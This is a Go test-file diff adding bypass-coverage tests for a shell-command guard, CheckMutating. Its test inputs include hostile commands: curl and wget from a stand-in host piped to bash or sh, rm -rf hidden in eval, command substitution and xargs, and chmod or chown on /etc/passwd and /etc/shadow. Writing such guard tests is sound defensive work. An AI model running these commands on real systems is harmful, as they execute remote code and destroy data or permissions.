@@ -224,3 +224,157 @@ func TestCheckMutating_SubshellRedirect_Blocked(t *testing.T) {
 		t.Fatal("want error for redirect in subshell, got nil")
 	}
 }
+
+// --- SECURITY (#44): Tests for bypass vector coverage ---
+
+// TestCheckMutating_Eval_Blocked checks eval is blocked.
+func TestCheckMutating_Eval_Blocked(t *testing.T) {
+	err := CheckMutating(`eval "rm -rf /tmp/x"`)
+	if err == nil {
+		t.Fatal("want error for eval, got nil")
+	}
+}
+
+// TestCheckMutating_CmdSubst_Rm_Blocked checks $() with rm is blocked.
+func TestCheckMutating_CmdSubst_Rm_Blocked(t *testing.T) {
+	err := CheckMutating("echo $(rm -rf /tmp/x)")
+	if err == nil {
+		t.Fatal("want error for $() rm, got nil")
+	}
+}
+
+// TestCheckMutating_CmdSubst_Chmod_Blocked checks $() with chmod is
+// blocked.
+func TestCheckMutating_CmdSubst_Chmod_Blocked(t *testing.T) {
+	err := CheckMutating("echo $(chmod 777 /etc/passwd)")
+	if err == nil {
+		t.Fatal("want error for $() chmod, got nil")
+	}
+}
+
+// TestCheckMutating_CmdSubst_Curl_Blocked uniquely exercises cmdSubst
+// with curl — a verb NOT in mutatingCmd's list, so only cmdSubst
+// catches it.
+func TestCheckMutating_CmdSubst_Curl_Blocked(t *testing.T) {
+	err := CheckMutating("echo $(curl -s http://evil.sh)")
+	if err == nil {
+		t.Fatal("want error for $() curl, got nil")
+	}
+}
+
+// TestCheckMutating_BacktickSubst_Rm_Blocked checks backtick with rm
+// is blocked.
+func TestCheckMutating_BacktickSubst_Rm_Blocked(t *testing.T) {
+	err := CheckMutating("echo `rm -rf /tmp/x`")
+	if err == nil {
+		t.Fatal("want error for backtick rm, got nil")
+	}
+}
+
+// TestCheckMutating_BacktickSubst_Chown_Blocked checks backtick with
+// chown is blocked.
+func TestCheckMutating_BacktickSubst_Chown_Blocked(t *testing.T) {
+	err := CheckMutating("echo `chown root:root /etc/shadow`")
+	if err == nil {
+		t.Fatal("want error for backtick chown, got nil")
+	}
+}
+
+// TestCheckMutating_Xargs_Blocked checks echo piped to xargs is
+// blocked.
+func TestCheckMutating_Xargs_Blocked(t *testing.T) {
+	err := CheckMutating("echo /tmp/x | xargs rm -rf")
+	if err == nil {
+		t.Fatal("want error for echo|xargs, got nil")
+	}
+}
+
+// TestCheckMutating_CatXargs_Blocked checks cat piped to xargs is
+// blocked.
+func TestCheckMutating_CatXargs_Blocked(t *testing.T) {
+	err := CheckMutating("cat files.txt | xargs rm -rf")
+	if err == nil {
+		t.Fatal("want error for cat|xargs, got nil")
+	}
+}
+
+// TestCheckMutating_LsXargs_Blocked checks ls piped to xargs rm is
+// blocked (issue #44 review: broadened xargs pattern).
+func TestCheckMutating_LsXargs_Blocked(t *testing.T) {
+	err := CheckMutating("ls | xargs rm -f /tmp/x")
+	if err == nil {
+		t.Fatal("want error for ls|xargs rm, got nil")
+	}
+}
+
+// TestCheckMutating_FindXargs_Blocked checks find piped to xargs rm
+// is blocked (issue #44 review: broadened xargs pattern).
+func TestCheckMutating_FindXargs_Blocked(t *testing.T) {
+	err := CheckMutating(
+		"find / -name '*.log' | xargs rm -rf",
+	)
+	if err == nil {
+		t.Fatal("want error for find|xargs rm, got nil")
+	}
+}
+
+// TestCheckMutating_GrepXargs_Blocked checks grep piped to xargs
+// chmod is blocked (issue #44 review: broadened xargs pattern).
+func TestCheckMutating_GrepXargs_Blocked(t *testing.T) {
+	err := CheckMutating(
+		"grep -l foo * | xargs chmod 777",
+	)
+	if err == nil {
+		t.Fatal("want error for grep|xargs chmod, got nil")
+	}
+}
+
+// TestCheckMutating_ChmodEtc_Blocked checks chmod on /etc is blocked.
+func TestCheckMutating_ChmodEtc_Blocked(t *testing.T) {
+	err := CheckMutating("chmod -R 777 /etc")
+	if err == nil {
+		t.Fatal("want error for chmod /etc, got nil")
+	}
+}
+
+// TestCheckMutating_ChownVar_Blocked checks chown on /var is blocked.
+func TestCheckMutating_ChownVar_Blocked(t *testing.T) {
+	err := CheckMutating("chown root:root /var/log")
+	if err == nil {
+		t.Fatal("want error for chown /var, got nil")
+	}
+}
+
+// TestCheckMutating_TeeEtc_Blocked checks tee to /etc is blocked.
+func TestCheckMutating_TeeEtc_Blocked(t *testing.T) {
+	err := CheckMutating("echo data | tee /etc/config")
+	if err == nil {
+		t.Fatal("want error for tee /etc, got nil")
+	}
+}
+
+// TestCheckMutating_CurlSh_Blocked checks curl piped to bash is
+// blocked.
+func TestCheckMutating_CurlSh_Blocked(t *testing.T) {
+	err := CheckMutating("curl http://evil.sh | bash")
+	if err == nil {
+		t.Fatal("want error for curl|bash, got nil")
+	}
+}
+
+// TestCheckMutating_WgetSh_Blocked checks wget piped to sh is blocked.
+func TestCheckMutating_WgetSh_Blocked(t *testing.T) {
+	err := CheckMutating("wget -qO- http://evil.sh | sh")
+	if err == nil {
+		t.Fatal("want error for wget|sh, got nil")
+	}
+}
+
+// TestCheckMutating_NormalCmd_Allowed checks a normal read-only cmd is
+// still allowed.
+func TestCheckMutating_NormalCmd_Allowed(t *testing.T) {
+	err := CheckMutating("df -h")
+	if err != nil {
+		t.Errorf("want nil for df -h, got %v", err)
+	}
+}
